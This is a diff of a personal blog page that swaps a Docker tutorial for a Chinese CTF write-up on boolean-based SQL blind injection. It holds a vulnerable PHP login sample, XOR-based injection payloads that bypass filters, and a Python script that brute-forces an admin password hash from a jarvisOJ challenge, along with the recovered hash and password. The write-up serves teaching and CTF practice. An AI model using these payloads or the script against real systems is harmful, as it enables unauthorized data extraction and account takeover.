@@ -96,20 +96,20 @@
 
 
 
-  <meta name="description" content="一、环境准备1、安装docker参照https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分 二、搭建静态网站1、创建docker镜像12docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器root@6f9c831d1d1b:/#        //进入dock">
-<meta name="keywords" content="docker">
+  <meta name="description" content="布尔盲注漏洞解释：根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。 应用场景：根据用户名和密码的输入，页面返回密码错误和用户名错误两种类型。利用返回不同，逐个拆解密码。 1234567891011121314151617auth.php$username = $_POST[&quot;username&quot;];$username = str_replace(&apos; &apos;,">
+<meta name="keywords" content="web,sql注入,盲注">
 <meta property="og:type" content="article">
-<meta property="og:title" content="使用docker部署静态网站">
-<meta property="og:url" content="https://j-kangel.github.io/2019/03/25/docker/index.html">
+<meta property="og:title" content="几种sql盲注">
+<meta property="og:url" content="https://j-kangel.github.io/2019/04/06/blindsqlinjection/index.html">
 <meta property="og:site_name" content="KANGEL">
-<meta property="og:description" content="一、环境准备1、安装docker参照https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分 二、搭建静态网站1、创建docker镜像12docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器root@6f9c831d1d1b:/#        //进入dock">
+<meta property="og:description" content="布尔盲注漏洞解释：根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。 应用场景：根据用户名和密码的输入，页面返回密码错误和用户名错误两种类型。利用返回不同，逐个拆解密码。 1234567891011121314151617auth.php$username = $_POST[&quot;username&quot;];$username = str_replace(&apos; &apos;,">
 <meta property="og:locale" content="Chinese">
-<meta property="og:image" content="https://j-kangel.github.io/2019/03/25/docker/0.JPG">
-<meta property="og:updated_time" content="2019-04-04T06:53:13.702Z">
+<meta property="og:image" content="https://j-kangel.github.io/2019/04/06/blindsqlinjection/1.JPG">
+<meta property="og:updated_time" content="2019-04-11T08:27:32.129Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="使用docker部署静态网站">
-<meta name="twitter:description" content="一、环境准备1、安装docker参照https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分 二、搭建静态网站1、创建docker镜像12docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器root@6f9c831d1d1b:/#        //进入dock">
-<meta name="twitter:image" content="https://j-kangel.github.io/2019/03/25/docker/0.JPG">
+<meta name="twitter:title" content="几种sql盲注">
+<meta name="twitter:description" content="布尔盲注漏洞解释：根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。 应用场景：根据用户名和密码的输入，页面返回密码错误和用户名错误两种类型。利用返回不同，逐个拆解密码。 1234567891011121314151617auth.php$username = $_POST[&quot;username&quot;];$username = str_replace(&apos; &apos;,">
+<meta name="twitter:image" content="https://j-kangel.github.io/2019/04/06/blindsqlinjection/1.JPG">
 
 
 
@@ -119,7 +119,7 @@
 
   
   
-  <link rel="canonical" href="https://j-kangel.github.io/2019/03/25/docker/"/>
+  <link rel="canonical" href="https://j-kangel.github.io/2019/04/06/blindsqlinjection/"/>
 
 
 
@@ -129,7 +129,7 @@
   };
 </script>
 
-  <title>使用docker部署静态网站 | KANGEL</title>
+  <title>几种sql盲注 | KANGEL</title>
   
 
 
@@ -328,7 +328,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://j-kangel.github.io/2019/03/25/docker/"/>
+    <link itemprop="mainEntityOfPage" href="https://j-kangel.github.io/2019/04/06/blindsqlinjection/"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="kangel"/>
@@ -345,7 +345,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">使用docker部署静态网站
+          <h1 class="post-title" itemprop="name headline">几种sql盲注
 
               
             
@@ -371,7 +371,7 @@
                 
               
 
-              <time title="Created: 2019-03-24 20:11:21" itemprop="dateCreated datePublished" datetime="2019-03-24T20:11:21Z">2019-03-24</time>
+              <time title="Created: 2019-04-05 17:43:58" itemprop="dateCreated datePublished" datetime="2019-04-05T17:43:58Z">2019-04-05</time>
             
 
             
@@ -388,7 +388,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-04-04 06:53:13" itemprop="dateModified" datetime="2019-04-04T06:53:13Z">2019-04-04</time>
+                <time title="Modified: 2019-04-11 08:27:32" itemprop="dateModified" datetime="2019-04-11T08:27:32Z">2019-04-11</time>
               
             
           </span>
@@ -405,7 +405,14 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/区块链学习/" itemprop="url" rel="index"><span itemprop="name">区块链学习</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/jarvisOJ/" itemprop="url" rel="index"><span itemprop="name">jarvisOJ</span></a></span>
 
                 
                 
@@ -440,23 +447,24 @@
       
 
       
-        <h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h4><p>参照<a href="https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分">https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分</a></p>
-<h3 id="二、搭建静态网站"><a href="#二、搭建静态网站" class="headerlink" title="二、搭建静态网站"></a>二、搭建静态网站</h3><h4 id="1、创建docker镜像"><a href="#1、创建docker镜像" class="headerlink" title="1、创建docker镜像"></a>1、创建docker镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器</span><br><span class="line">root@6f9c831d1d1b:/<span class="comment">#        //进入docker交互式容器</span></span><br></pre></td></tr></table></figure>
-<h4 id="2、在docker中安装nginx和vim"><a href="#2、在docker中安装nginx和vim" class="headerlink" title="2、在docker中安装nginx和vim"></a>2、在docker中安装nginx和vim</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get update</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y nginx</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y vim</span></span><br></pre></td></tr></table></figure>
-<h4 id="3、创建网页目录"><a href="#3、创建网页目录" class="headerlink" title="3、创建网页目录"></a>3、创建网页目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># mkdir -p /var/www/html</span></span><br></pre></td></tr></table></figure>
-<h4 id="4、添加网页"><a href="#4、添加网页" class="headerlink" title="4、添加网页"></a>4、添加网页</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># cd /var/www/html</span></span><br><span class="line">root@6f9c831d1d1b:/var/www/html<span class="comment"># vim index.html</span></span><br></pre></td></tr></table></figure>
-<p>在index.html中输入：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>nginx in docker<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            Hello,World!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>保存后退出，查看端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port web</span><br></pre></td></tr></table></figure>
-<p>显示如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp -&gt; 0.0.0.0:32770</span><br></pre></td></tr></table></figure>
-<h4 id="5、查看网页"><a href="#5、查看网页" class="headerlink" title="5、查看网页"></a>5、查看网页</h4><p>使用curl查看：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:32770     <span class="comment">#32770为容器端口</span></span><br></pre></td></tr></table></figure>
-<p>使用浏览器查看,如下图所示：</p>
-<p><img src="/2019/03/25/docker/0.JPG" alt=""></p>
-<h3 id="三、docker其他命令"><a href="#三、docker其他命令" class="headerlink" title="三、docker其他命令"></a>三、docker其他命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker attach web  <span class="comment">##重新进入容器</span></span><br><span class="line">docker ps          <span class="comment">##查看docker进程</span></span><br><span class="line">docker top web     <span class="comment">##查看docker容器的进程</span></span><br><span class="line">docker inspect | grep -i IPaddress   <span class="comment">##查看docker的ip地址</span></span><br><span class="line">docker inspect | grep -i hostport    <span class="comment">##查看容器端口</span></span><br></pre></td></tr></table></figure>
-
+        <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>漏洞解释：根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。</p>
+<p>应用场景：根据用户名和密码的输入，页面返回密码错误和用户名错误两种类型。利用返回不同，逐个拆解密码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">auth.php</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$username = str_replace(<span class="string">' '</span>, <span class="string">''</span>, $username); <span class="comment">//过滤空格</span></span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">$sql = <span class="string">"select password from admin where username = '"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$rowcount = mysql_num_rows($result);</span><br><span class="line"><span class="keyword">if</span> $rowcount == <span class="number">0</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'用户名错误'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ($rowcount--)&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username = <span class="string">'admin'</span> <span class="keyword">and</span> $password = $result[$row])&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'密码错误'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">"admin'^(ascii(mid((password)from(str（1)))=ord（1)^1#"</span></span><br></pre></td></tr></table></figure>
+<p><code>^</code>表示异或，将username分为三段，<code>admin&#39;</code>（假设存在该用户名）和<code>1</code>异或为0，所以username的真值由<code>(ascii(mid((password)from(str（1)))=ord（1)</code>决定。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid()函数</span><br><span class="line">mid（“kangel” from（str（3）） //返回&quot;kangel&quot;从第三个字符开始的所有字符，即&quot;gel&quot;</span><br><span class="line">assic()函数</span><br><span class="line">assic(&quot;abc&quot;)   //返回“abc”第一个字符的assic值，即97</span><br><span class="line">(ascii(mid((password)from(str（1)))=ord（1)   //password第一个字符assic值与&quot;1&quot;的assic值（49）进行比较</span><br></pre></td></tr></table></figure>
+<p>因此，若过滤了<code>=</code>，则可以替换为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &quot;admin&apos;^(ascii(mid((password)from(str（1)))&lt;&gt;ord（1)^0#&quot;</span><br></pre></td></tr></table></figure>
+<p>例题：<a href="http://web.jarvisoj.com:32787/login.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32787/login.php</a></p>
+<p><img src="/2019/04/06/blindsqlinjection/1.JPG" alt=""></p>
+<p>判断登录漏洞类型，输入<code>admin</code>、<code>admin</code>返回密码错误，输入<code>kangel</code>、<code>123</code>返回用户名错误</p>
+<p>继续判断过滤字符，username输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;^(ascii(mid((password)from(&apos;1&apos;))&lt;&gt;97^0#&quot;  //用户名错误</span><br><span class="line">admin&apos;^(ascii(mid((password)from(1)))=97)^0#    //密码错误</span><br></pre></td></tr></table></figure>
+<p>该payload有效，猜测密码为md5值存储，上脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">str_hex = <span class="string">'0123456789abcdef'</span></span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32787/login.php"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_hex:</span><br><span class="line">        username = <span class="string">"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(index),ord(i))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: username,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'admin'</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(username)</span><br><span class="line">        s = r.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> s.text:</span><br><span class="line">            password += i</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure>
+<p>得到password：<code>334cfb59c9d74849801d5acdcfdaadc3</code>，MD5解密得：<code>eTAloCrEP</code>，用<code>admin</code>、<code>eTAloCrEP</code>登录得到flag。</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3>
       
     </div>
 
@@ -489,7 +497,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/docker/" rel="tag"><i class="fa fa-tag"></i>docker</a>
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i>web</a>
+          
+            <a href="/tags/sql注入/" rel="tag"><i class="fa fa-tag"></i>sql注入</a>
+          
+            <a href="/tags/盲注/" rel="tag"><i class="fa fa-tag"></i>盲注</a>
           
         </div>
       
@@ -502,8 +514,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/24/hyperledger/" rel="next" title="Ubuntu 16.04 搭建hyperledger fabric 1.4">
-                <i class="fa fa-chevron-left"></i> Ubuntu 16.04 搭建hyperledger fabric 1.4
+              <a href="/2019/04/05/hash-attack/" rel="next" title="hash长度扩展攻击">
+                <i class="fa fa-chevron-left"></i> hash长度扩展攻击
               </a>
             
           </div>
@@ -512,8 +524,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/03/28/trade-finance/" rel="prev" title="trade-finance-logistics网络运行与分析">
-                trade-finance-logistics网络运行与分析 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/04/07/sql注入之反引号/" rel="prev" title="sql注入之反引号">
+                sql注入之反引号 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -710,7 +722,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、环境准备"><span class="nav-number">1.</span> <span class="nav-text">一、环境准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、安装docker"><span class="nav-number">1.1.</span> <span class="nav-text">1、安装docker</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、搭建静态网站"><span class="nav-number">2.</span> <span class="nav-text">二、搭建静态网站</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、创建docker镜像"><span class="nav-number">2.1.</span> <span class="nav-text">1、创建docker镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、在docker中安装nginx和vim"><span class="nav-number">2.2.</span> <span class="nav-text">2、在docker中安装nginx和vim</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、创建网页目录"><span class="nav-number">2.3.</span> <span class="nav-text">3、创建网页目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、添加网页"><span class="nav-number">2.4.</span> <span class="nav-text">4、添加网页</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、查看网页"><span class="nav-number">2.5.</span> <span class="nav-text">5、查看网页</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、docker其他命令"><span class="nav-number">3.</span> <span class="nav-text">三、docker其他命令</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔盲注"><span class="nav-number">1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#时间盲注"><span class="nav-number">2.</span> <span class="nav-text">时间盲注</span></a></li></ol></div>
             
 
           </div>
